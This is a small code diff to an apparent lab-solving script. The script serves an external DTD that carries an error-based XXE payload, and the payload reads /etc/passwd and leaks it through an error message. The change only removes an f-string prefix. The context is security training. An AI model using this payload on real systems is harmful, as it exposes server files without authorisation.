@@ -7,7 +7,7 @@ def solve_lab(session):
     head = ["HTTP/1.0 200 OK", "Content-Type: text/xml; charset=utf-8"]
     body = [
         '<!ENTITY % file SYSTEM "file:///etc/passwd">',
-        f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
+        "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
         "%eval;",
         "%error;",
     ]
